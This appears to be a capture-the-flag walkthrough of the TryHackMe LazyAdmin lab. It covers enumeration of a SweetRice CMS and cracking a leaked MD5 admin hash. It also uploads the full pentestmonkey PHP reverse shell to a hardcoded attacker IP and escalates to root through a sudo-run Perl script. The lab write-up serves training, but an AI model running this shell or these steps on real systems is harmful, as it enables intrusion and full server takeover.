Room Link: [LazyAdmin Room Link](https://tryhackme.com/room/lazyadmin)

add machine IP to `/etc/hosts`

```shell
sudo echo "10.48.181.50    lazyadmin.thm" >> /etc/hosts
```

First we are gonna perform NMAP scan

```shell
nmap -A lazyadmin.thm -T5 -v
```

![](Pasted%20image%2020260204163617.png)


this is what we got.

let enumerate the directories

```shell
gobuster dir -u http://lazyadmin.thm -w /usr/share/wordlists/dirb/common.txt
```

![](Pasted%20image%2020260204163904.png)

we found these directories

lets visit them

![](Pasted%20image%2020260204164014.png)

this is what is in the `/content`

upon seeing this we can identify that this website is built on `basic-cms - sweet rice`

and the `webmaster` is guided towards Dashboard.

let's directory enumerate `/content` more.

```shell
gobuster dir -u http://lazyadmin.thm/content -w /usr/share/wordlists/dirb/common.txt
```

we found some interesting files here too:

![](Pasted%20image%2020260204180140.png)

let's see what's there in `/as`

![](Pasted%20image%2020260204170210.png)

we got the login page here, so that means we got the dashboard here which was for the webmaster.

but we don't have creds yet and there are more directories to enumerate.

so let's check `/inc` 

![](Pasted%20image%2020260204180732.png)

here we can see a `mysql_backup file`

![](Pasted%20image%2020260204181131.png)
in this file there is something really interesting

a `MD5 hash` `42f749ade7f9e195bf475f37a44cafcb`

![](Pasted%20image%2020260204181255.png)

you can crack it using [crackstation](https://crackstation.net/)

and as seen the username is `manager`.

![](Pasted%20image%2020260204181721.png)

and yes you can see we got the access to the dashboard.

### Getting the shell

now our target is to get the reverse shell 

To do that we have to think of running a file on the web server.

navigate to `media center` there we can upload the file.

and run it.

so here i'm gonna use a `php` file with the reverse shell script in it.

make the zip of that `php` reverse shell file and upload it and check the box as seen below.


```php5
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.138.111';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 



```

setup a `nc -lvnp 4444` listener to port 4444.

![](Pasted%20image%2020260204185038.png)

add this file and visit `/content/inc`

![](Pasted%20image%2020260204185153.png)

here we go we got the reverse shell.

![](Pasted%20image%2020260204185357.png)
we got the `user.txt` flag

let's see how can `itguy` get the root permission.

![](Pasted%20image%2020260204185614.png)


![](Pasted%20image%2020260204200305.png)


as you can see the script, we can edit it and replace `/etc/copy.sh`  with the our own script

```perl
#!/usr/bin/perl
system("/bin/bash");
```
![](Pasted%20image%2020260204201426.png)

![](Pasted%20image%2020260204201922.png)

the commands in the above image will get you reverse connection to your attacker system.

setup the listener

`nc -lvnp 5555`

`sudo /bin/perl /home/itguy/backup.pl`

![](Pasted%20image%2020260204202621.png)

here we go, we got the root reverse shell, and `root.txt` flag.




